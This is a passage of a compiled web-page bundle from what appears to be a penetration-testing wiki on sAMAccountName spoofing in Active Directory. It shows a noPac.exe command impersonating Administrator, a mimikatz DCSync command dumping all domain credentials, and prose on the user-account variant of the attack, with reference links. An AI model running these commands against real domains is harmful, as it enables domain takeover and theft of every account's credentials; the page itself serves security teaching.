`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"noPac.exe"),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," -"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"domain mcafeelab.local "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"-"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"user "),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"lowpriv"'),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," -"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"pass "),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"lowpriv"'),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," /"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"dc dc.domain.local "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"/"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"mAccount pillemann11 "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"/"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"mPassword pilleman11 "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"/"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"service ldaps "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"/"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"ptt "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"/"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"impersonate Administrator")]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"(mimikatz) lsadump::dcsync "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"/"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"domain:mcafeelab.local "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"/"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"all")])])])],-1)])),_:1})]),_:1}),a[3]||(a[3]=h('<div class="warning custom-block"><p>In the screenshot below, the <code>-spn</code> argument is used in the <code>getST.py</code> command. The option is to be replaced with <code>-altservice</code>.</p></div><p class="caption"><img src="'+p+'" alt=""> sAMAccountName spoofing example</p><h3 id="user-account" tabindex="-1">User account <a class="header-anchor" href="#user-account" aria-label="Permalink to &quot;User account&quot;">â€‹</a></h3><p>An alternative to using computer accounts is to have enough permissions against a user account (cf. <a href="./../dacl/">Access Controls abuse</a>) to edit its <code>sAMAccountName</code> attribute (i.e. <code>WriteProperty</code> on the attribute, or on the Â« general information Â» or Â« public information Â» property sets, or <code>GenericWrite</code>, or <code>GenericAll</code>).</p><p>This attack path also requires knowledge of the user account password or hash (to obtain a TGT), which can be obtained (or set) in many ways (e.g. <a href="./../dacl/targeted-kerberoasting">Targeted Kerberoasting</a>, <a href="./shadow-credentials">Shadow Credentials</a>, <a href="./../dacl/forcechangepassword">Forced Password Change</a>).</p><p>Appart from the computer account creation and SPNs manipulation, the exploitation steps are the same as with a <a href="./samaccountname-spoofing#machine-account">machine account</a>. If the account has SPNs that point to its name, they will have to be removed for the renaming operation to work.</p><h2 id="resources" tabindex="-1">Resources <a class="header-anchor" href="#resources" aria-label="Permalink to &quot;Resources&quot;">â€‹</a></h2><p><a href="https://exploit.ph/cve-2021-42287-cve-2021-42278-weaponisation.html" target="_blank" rel="noreferrer">https://exploit.ph/cve-2021-42287-cve-2021-42278-weaponisation.html</a></p><p><a href="https://exploit.ph/more-samaccountname-impersonation.html" target="_blank" rel="noreferrer">https://exploit.ph/more-samaccountname-impersonation.html</a></p><p><a href="https://cloudbrothers.info/en/exploit-kerberos-samaccountname-spoofing" target="_blank" rel="noreferrer">https://cloudbrothers.info/en/exploit-kerberos-samaccountname-spoofing</a></p><p><a href="https://twitter.com/snovvcrash/status/1471829627765239816" target="_blank" rel="noreferrer">https://twitter.com/snovvcrash/status/1471829627765239816</a></p>',11))])}const A=o(d,[["render",g]]);export{b as __pageData,A as default};
